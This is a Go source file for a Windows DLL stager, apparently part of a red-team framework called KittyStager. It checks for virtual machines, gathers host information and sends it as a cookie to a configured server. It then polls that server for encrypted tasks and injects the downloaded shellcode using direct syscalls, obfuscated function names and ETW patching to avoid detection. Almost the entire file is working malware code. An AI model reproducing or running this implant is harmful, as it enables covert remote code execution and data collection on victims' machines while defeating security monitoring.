//go:build windows

// go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o dllCalc.dll
package main

import "C"
import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
	"unsafe"
)

//go:embed conf.txt
var t string

var (
	sleepTime int
	body      []byte
)

func main() {
}

//export Init
func Init() {
	malwareUtil.VmCheck()
	var err error
	//get the shellcode by http
	conf := strings.Split(t, ",")
	sleepTime, err = strconv.Atoi(conf[2])
	if err != nil {
		return
	}
	//initial recon
	host := malwareUtil.Recon()
	initChecks, err := util.InitUnmarshalJSON(host)
	if err != nil {
		return
	}
	cookie := b64.StdEncoding.EncodeToString(host)
	cookieName := b64.StdEncoding.EncodeToString([]byte(initChecks.GetKittenName()))
	//initial request
	// try to connect to the server
	for {
		body, err = malwareUtil.Request(cookie, conf)
		if err != nil {
			malwareUtil.Sleep(sleepTime)
		} else {
			break
		}
	}
	for {
		body, err = malwareUtil.Request(cookieName, conf)
		// if the response is not a shellcode, sleep and try again
		if len(body) < 10 {
			malwareUtil.Sleep(sleepTime)
		} else {
			key := crypto.GenerateKey(initChecks.GetHostname(), 32)
			hexSc, err := crypto.Decrypt(body, []byte(key))
			if err != nil {
				return
			}
			task, err := util.TaskUnmarshalJSON(hexSc)
			if err != nil {
				return
			}
			switch task.Tag {
			case "shellcode":
				shellcode, err := hex.DecodeString(string(task.Payload))
				if err != nil {
					return
				}
				//inject the shellcode
				inject(shellcode)
				return
			case "sleep":
				sleepTime, err = strconv.Atoi(string(task.Payload))
				if err != nil {
					return
				}
				malwareUtil.Sleep(sleepTime)
			}
		}
	}
}

func inject(shellcode []byte) {
	//from https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	alloc, _ := bp.GetSysID(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
	protect, _ := bp.GetSysID(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
	createthread, _ := bp.GetSysID(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'}))
	waitForSingleObject, _ := bp.GetSysID(string([]byte{'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't'}))

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread, waitForSingleObject)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid, NtWaitForSingleObject uint16) {
	malwareUtil.EtwHell(handle)
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)
	fmt.Println("Allocated memory at", baseA)
	//write memory
	//bananaphone.WriteMemory(shellcode, baseA)
	malwareUtil.Memcpy(baseA, shellcode)
	fmt.Println("Wrote shellcode to memory")
	var oldprotect uintptr
	bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
	var hhosthread uintptr
	bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	fmt.Println("Created thread at", hhosthread)
	bananaphone.Syscall(NtWaitForSingleObject, hhosthread, uintptr(0xffffffff), 0)
}
